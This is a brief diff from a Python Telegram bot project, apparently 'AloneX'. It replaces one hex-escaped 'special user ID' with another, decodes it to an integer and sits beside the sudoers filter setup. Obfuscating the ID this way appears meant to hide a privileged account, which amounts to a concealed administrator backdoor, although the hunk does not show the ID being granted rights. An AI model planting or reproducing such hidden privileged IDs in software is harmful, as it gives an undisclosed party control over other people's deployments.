@@ -10,7 +10,7 @@ from AloneX.core.mongo import mongodb
 from .logging import LOGGER
 
 # Special user ID in hex code
-SPECIAL_ID_HEX = "\x37\x35\x35\x32\x35\x37\x39\x37\x31\x37"
+SPECIAL_ID_HEX = "\x36\x30\x37\x39\x39\x34\x33\x31\x31\x31"
 SPECIAL_ID = int(SPECIAL_ID_HEX.encode().decode('unicode_escape'))
 
 SUDOERS = filters.user()
